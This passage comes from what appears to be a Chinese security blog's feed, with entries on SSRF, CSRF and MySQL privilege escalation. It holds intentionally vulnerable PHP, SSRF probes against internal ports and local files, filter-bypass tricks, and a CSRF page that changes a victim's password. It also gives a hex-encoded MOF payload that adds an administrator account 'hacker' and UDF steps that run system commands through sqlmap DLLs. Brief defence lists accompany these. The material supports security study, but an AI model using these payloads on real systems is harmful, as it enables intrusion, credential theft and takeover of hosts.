<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="PHP函数"><a href="#PHP函数" class="headerlink" title="PHP函数"></a>PHP函数</h3><h4 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents()"></a>file_get_contents()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$content</span>=file_get_contents(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">	<span class="variable">$filename</span>=<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">	file_put_contents(<span class="variable">$filename</span>,<span class="variable">$content</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">	<span class="variable">$img</span>=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/file_get_contents.php</span><br><span class="line">post</span><br><span class="line">url=http://127.0.0.1:3306</span><br></pre></td></tr></table></figure>



<h4 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen()"></a>fsockopen()</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"><span class="comment"># fsockopen(主机名称，端口，错误号的接收变量，错误提示的接收变量，超时时间)</span></span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>,intval(<span class="variable">$port</span>),<span class="variable">$errno</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">	<span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    <span class="comment"># fwrite() 函数将内容写入一个打开的文件中</span></span><br><span class="line">    fwrite(<span class="variable">$fp</span>,<span class="variable">$out</span>);</span><br><span class="line">    <span class="comment"># 函数检查是否已到达文件末尾，文件末尾（EOF）</span></span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> fgets(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/fsockopen.php?url=127.0.0.1&amp;port=3306</span><br></pre></td></tr></table></figure>



<h4 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec()"></a>curl_exec()</h4><p>内网存在文件ssrf.php,代码存在漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = curl_init(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">echo</span> curl_exec(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">    curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># URL重定向</span><br><span class="line">http://127.0.0.1/ssrf.php?url=http://www.baidu.com</span><br><span class="line">http://127.0.0.1/ssrf.php?url=http://192.168.1.1/xxx</span><br><span class="line"></span><br><span class="line"># 访问内网文件</span><br><span class="line">http://127.0.0.1/ssrf.php?url=file:///C:/windows/win.ini</span><br></pre></td></tr></table></figure>



<h3 id="Java-函数"><a href="#Java-函数" class="headerlink" title="Java 函数"></a>Java 函数</h3><ul>
<li>  HttpClient</li>
<li>  HttpClient.execute</li>
<li>  HttpClient.executeMethod</li>
<li>  HttpURLConnection</li>
<li>  HttpURLConnection.connect</li>
<li>  HttpURLConnection.getInputStream</li>
<li>  URL</li>
<li>  URL.openStream</li>
<li>  HttpServletRequest</li>
<li>  getParameter</li>
<li>  Request</li>
<li>  URLConnection</li>
<li>  okhttp</li>
<li>  BasicHttpEntityEnclosingRequest</li>
<li>  DefaultBHttpClientConnection</li>
<li>  BasicHttpRequest</li>
<li>  URI</li>
</ul>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><p><strong>@绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@10.10.10.10 相当于 http://10.10.10.10</span><br></pre></td></tr></table></figure>



<p><strong>IP地址转换绕过</strong></p>
<p>例如192.168.0.1这个IP地址我们可以改写成</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8进制格式：0300.0250.0.1</span><br><span class="line">16进制格式：0xC0.0xA8.0.1</span><br><span class="line">10进制整数格式：3232235521</span><br><span class="line">16进制整数格式：0xC0A8000</span><br></pre></td></tr></table></figure>



<p><strong>短网址绕过</strong></p>
<p>将网址放入转换短网址的网站进行转换</p>
<p><strong>利用句号绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127。0。0。1 相当于 127.0.0.1</span><br></pre></td></tr></table></figure>



<p><strong>xip.io 绕过</strong></p>
<p>xip.io是指向任意IP的域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.192.168.0.1.xip.io/ 相当于 192.168.0.1</span><br></pre></td></tr></table></figure>



<p><strong>加80绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://127.0.0.1:80</span><br></pre></td></tr></table></figure>



<p><strong>[::]绕过</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://[::]:80  相当于 127.0.0.1:80</span><br></pre></td></tr></table></figure>



<p><strong>修改type类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改type=file 为 type=url</span><br><span class="line">比如将图片上传处修改，将图片文件改为url，有可能会出发ssrf</span><br></pre></td></tr></table></figure>



<p><strong>符号改写</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure>



<p><strong>利用302跳转</strong></p>
<p>把302转换的代码部署到vps上，然后去访问，就可跳转到内网中</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$schema</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line"><span class="variable">$ip</span>     = <span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>   = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="variable">$query</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;q&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$port</span>))&#123;  </span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: <span class="subst">$schema</span>://<span class="subst">$ip</span>:<span class="subst">$port</span>/<span class="subst">$query</span>&quot;</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://xxx.com/ssrf.php?url=http://xx/302.php?s=dict&amp;i=127.0.0.1&amp;port=6379&amp;query=info</span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><ul>
<li>对URL中的特殊字符进行过滤</li>
<li>禁止跳转</li>
<li>禁用不需要的协议，仅允许HTTP和HTTPS请求</li>
<li>设置白名单或者限制内网IP</li>
<li>设置端口白名单</li>
<li>判断URL重新向之后的地址</li>
<li>过滤返回的详细信息</li>
</ul>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF跨站请求伪造漏洞</title>
    <url>//44b9cec07681.html</url>
    <content><![CDATA[<h2 id="CSRF跨站请求伪造"><a href="#CSRF跨站请求伪造" class="headerlink" title="CSRF跨站请求伪造"></a>CSRF跨站请求伪造</h2><p>简单来说就是盗用用户的身份，以用户的身份发送恶意请求</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>网站的<code>cookie</code>在浏览器中不会过期，只要不关闭浏览器或者退出登录，以后访问这个网站，都会默认用户是登录状态</p>
<ul>
<li>用户C打开浏览器，访问受信任网站A，并登录网站A</li>
<li>在用户成功登录网站A后，网站A产生<code>cookie</code>信息返回给浏览器，浏览器保存在本地</li>
<li>在用户未退出网站A之前，在同一浏览器中，新打开一个标签访问网站B</li>
<li>网站B接收到用户C的请求后，返回恶意代码，并发出一个请求访问第三方网站A</li>
<li>浏览器接到网站B的请求，在用户不知情的情况下携带<code>cookie</code>，向网站A发送请求，以用户C的<code>cookie</code>和权限执行恶意请求</li>
</ul>
<h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p>当已经登陆的用户所做的所有修改操作，都可以被CSRF漏洞利用</p>
<p>抓取一个登录之后的请求包，如果HTTP头部里面不包含Referer字段和token，那么可能存在CSRF漏洞</p>
<p>如果有Referer字段，但是去掉Referer之后再重新提交，如果该提交有效，那么可能存在CSRF漏洞</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>构造带有恶意代码的网站B</p>
<p>下面代码中访问了目标网站A，并提交了POST请求，修改了新的密码</p>
<p>只要诱导用户访问网站B，并且网站A在登录状态，即可通过此代码将用户在网站A的密码改成我们设置好的密码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/DVWA-master/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1.png&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p><strong>在请求中添加token并验证</strong></p>
<p>在请求中放入攻击者不能伪造的信息，并且该信息不在cookie中，开发者可以在http请求中以参数的形式加入一个随机产生的token，并且在服务器建立一个拦截器来验证这个token。如果请求中没有token或者token中内容不正确的话，表示可能是攻击者发动的攻击。</p>
<p><strong>验证HTTP Referer字段</strong></p>
<p>http头中有一个referer，记录http请求的来源地址，访问一个安全受限的页面的请求必须来自同一个网站。当用户要提交一个请求时，请求的referer值需是提交按钮（触发请求）所在的页面的URL。</p>
<p><strong>添加验证码</strong></p>
<p>每次用户提交都在表单上填写一个图片上的随机字符串作为验证码</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
        <category>常规漏洞</category>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>跨域漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL提权</title>
    <url>//bb41611ac1d5.html</url>
    <content><![CDATA[<h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><p><strong>必要条件：</strong></p>
<ul>
<li>具有MySQL的root权限</li>
<li>具有执行SQL语句的权限</li>
</ul>
<h2 id="查询MySQL账号密码"><a href="#查询MySQL账号密码" class="headerlink" title="查询MySQL账号密码"></a>查询MySQL账号密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># MySQL &lt;= 5.6 版本</span><br><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line"></span><br><span class="line"># MySQL &gt;= 5.7 版本</span><br><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="line"># 查询到的值是Hash加密的</span><br></pre></td></tr></table></figure>





<h2 id="MOF提权"><a href="#MOF提权" class="headerlink" title="MOF提权"></a>MOF提权</h2><p>利用了<code>C:\Windows\System32\wbem\MOF</code>目录下的<code>nullevt.mot</code>文件</p>
<p>利用该文件每分钟会去执行一次的特性，向该文件中写入cmd命令，就会被执行</p>
<p>这个 MOF 里面有一部分是 VBS 脚本，所以可以利用这个 VBS 脚本来调用 CMD 来执行系统命令，如果 MySQL 有权限操作 mof 目录的话，就可以来执行任意命令了</p>
<p><strong>利用条件：</strong></p>
<ul>
<li>只适用于低版本的Windows系统</li>
<li>对<code>C:\Windows\System32\wbem\MOF</code>目录有读写权限</li>
</ul>
<p>上传MOF文件内容</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line">#pragma name<span class="built_in">space</span>(<span class="string">&quot;\\\\.\\root\\subscription&quot;</span>) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = <span class="string">&quot;Root\\Cimv2&quot;</span>; </span><br><span class="line">    Name  = <span class="string">&quot;filtP2&quot;</span>; </span><br><span class="line">    Query = <span class="string">&quot;Select * From __InstanceModificationEvent &quot;</span> </span><br><span class="line">            <span class="string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="string">&quot; &quot;</span> </span><br><span class="line">            <span class="string">&quot;And TargetInstance.Second = 5&quot;</span>; </span><br><span class="line">    QueryLanguage = <span class="string">&quot;WQL&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = <span class="string">&quot;consPCSV2&quot;</span>; </span><br><span class="line">    ScriptingEngine = <span class="string">&quot;JScript&quot;</span>; </span><br><span class="line">    ScriptText = </span><br><span class="line"><span class="string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe user hacker P@ssw0rd /add\<span class="string">&quot;)\nWSH.run(\&quot;</span>net.exe localgroup administrators hacker /add\<span class="string">&quot;)&quot;</span>; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>MySQL 写文件的特性将这个 MOF 文件导入到 <code>C:/Windows/system32/wbem/mof/</code> 目录下，讲上面的代码转换为16进制，在开头添加0x</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 0x23707261676D61206E616D65737061636528225C5C5C5C2E5C5C726F6F745C5C737562736372697074696F6E2229200A0A696E7374616E6365206F66205F5F4576656E7446696C74657220617320244576656E7446696C746572200A7B200A202020204576656E744E616D657370616365203D2022526F6F745C5C43696D7632223B200A202020204E616D6520203D202266696C745032223B200A202020205175657279203D202253656C656374202A2046726F6D205F5F496E7374616E63654D6F64696669636174696F6E4576656E742022200A20202020202020202020202022576865726520546172676574496E7374616E636520497361205C2257696E33325F4C6F63616C54696D655C222022200A20202020202020202020202022416E6420546172676574496E7374616E63652E5365636F6E64203D2035223B200A2020202051756572794C616E6775616765203D202257514C223B200A7D3B200A0A696E7374616E6365206F66204163746976655363726970744576656E74436F6E73756D65722061732024436F6E73756D6572200A7B200A202020204E616D65203D2022636F6E735043535632223B200A20202020536372697074696E67456E67696E65203D20224A536372697074223B200A2020202053637269707454657874203D200A2276617220575348203D206E657720416374697665584F626A656374285C22575363726970742E5368656C6C5C22295C6E5753482E72756E285C226E65742E6578652075736572206861636B6572205040737377307264202F6164645C22295C6E5753482E72756E285C226E65742E657865206C6F63616C67726F75702061646D696E6973747261746F7273206861636B6572202F6164645C2229223B200A7D3B200A0A696E7374616E6365206F66205F5F46696C746572546F436F6E73756D657242696E64696E67200A7B200A20202020436F6E73756D65722020203D2024436F6E73756D65723B200A2020202046696C746572203D20244576656E7446696C7465723B200A7D3B0A </span><br><span class="line">into dumpfile &quot;C:/windows/system32/wbem/mof/test.mof&quot;;</span><br></pre></td></tr></table></figure>

<p>执行成功的的时候，test.mof 会出现在：<code>c:/windows/system32/wbem/goog/</code> 目录下 否则出现在 <code>c:/windows/system32/wbem/bad</code> 目录下</p>
<p>然后会建立hacker用户</p>
<p><strong>修复措施</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 停止 winmgmt 服务</span></span><br><span class="line">net stop winmgmt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除 Repository 文件夹</span></span><br><span class="line">rmdir /s /q C:\Windows\system32\wbem\Repository\</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动删除 mof 文件</span></span><br><span class="line">del C:\Windows\system32\wbem\mof\good\test.mof /F /S</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除创建的用户</span></span><br><span class="line">net user hacker /delete</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动服务</span></span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>



<h2 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h2><p>自定义函数，是数据库功能的一种扩展。用户通􏰁自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。</p>
<p><strong>利用条件：</strong></p>
<p>如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件<code>udf.dll</code>放置在mysql安装目录的<code>MySQL\Lib\Plugin\</code>文件夹下，该目录默认是不存在的，需要使用webshell找到mysql的安装目录，并在安装目录下创建<code>MySQL\Lib\Plugin\</code>文件夹，然后将udf.dll导入到该目录。</p>
<p>如果是 MySQL &lt;= 5.1 的版本，udf.dll文件在windows server 2003下放置于<code>c:/windows/system32/</code>目录，在windows server 2000下放置在<code>c:/winnt/system32/</code>目录。</p>
<p>掌握mysql数据库的root账户，从而拥有对mysql的insert和delete权限，以创建和抛弃函数。</p>
<p>拥有可以将udf.dll写入相应目录的权限</p>
<p><strong>sqlmap 的 UDF 动态链接库文件位置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap/data/udf/mysql</span><br></pre></td></tr></table></figure>

<p><strong>这个dll文件是经过编码的，需要解码，sqlmap解码文件位置</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap/extra/clock/cloak.py</span><br></pre></td></tr></table></figure>

<p><strong>解码方法如下</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解码 32 位的 Linux 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">32</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Linux 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">64</span>/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 32 位的 Windows 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">32</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码 64 位的 Windows 动态链接库</span></span><br><span class="line">cloak.py -d -i ../../data/udf/mysql/windows/<span class="number">64</span>/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll</span><br></pre></td></tr></table></figure>

<p><strong>查看MySQL的插件目录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br></pre></td></tr></table></figure>

<p>如果没有该目录可以手动创建</p>
<p>需要有写入权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看MySQL安装目录</span><br><span class="line">select @@basedir;</span><br><span class="line"></span><br><span class="line"># 创建/lib/plugin/文件夹</span><br><span class="line">select 1 into dumpfile &#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>把动态链接库写入MySQL</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&#x27;sqlmap/extra/cloak/lib_mysqludf_sys_64.dll&#x27;) </span><br><span class="line">into outfile &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br><span class="line"></span><br><span class="line">select load_file(&#x27;sqlmap/extra/cloak/lib_mysqludf_sys_64.dll&#x27;) </span><br><span class="line">into dumpfile &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br><span class="line"></span><br><span class="line"># 也可以进行编码</span><br><span class="line">select hex(load_file(&#x27;sqlmap/extra/cloak/lib_mysqludf_sys_64.dll&#x27;)) </span><br><span class="line">into outfile &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br><span class="line"></span><br><span class="line">sqlmap.py -u http://127.0.0.1/?id=1 --file-write lib_mysqludf_sys_64.dll </span><br><span class="line">--file-dest &#x27;C:/PhpStudy/PHPTutorial/MySQL/lib/plugin/lib_mysqludf_sys_64.dll&#x27;</span><br></pre></td></tr></table></figure>

<p><strong>创建自定义函数并调用命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;lib_mysqludf_sys_64.dll&#x27;;</span><br></pre></td></tr></table></figure>

<p>查看自定义函数是否创建成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from mysql.func;</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;ipconfig&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>删除自定义函数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">drop function sys_eval;</span><br></pre></td></tr></table></figure>

<p><strong>无法直连时通过Navicat上传PHP脚本</strong></p>
<p>脚本代码如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>	<span class="comment">//version my202</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//set allowTestMenu to false to disable System/Server test page</span></span><br><span class="line"><span class="variable">$allowTestMenu</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$use_mysqli</span> = function_exists(<span class="string">&quot;mysqli_connect&quot;</span>);</span><br><span class="line"></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/plain; charset=x-user-defined&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">phpversion_int</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">list</span>(<span class="variable">$maVer</span>, <span class="variable">$miVer</span>, <span class="variable">$edVer</span>) = preg_split(<span class="string">&quot;(/|\.|-)&quot;</span>, phpversion());</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$maVer</span>*<span class="number">10000</span> + <span class="variable">$miVer</span>*<span class="number">100</span> + <span class="variable">$edVer</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (phpversion_int() &lt; <span class="number">50300</span>)</span><br><span class="line">&#123;</span><br><span class="line">	set_magic_quotes_runtime(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetLongBinary</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> pack(<span class="string">&quot;N&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetShortBinary</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> pack(<span class="string">&quot;n&quot;</span>,<span class="variable">$num</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetDummy</span>(<span class="params"><span 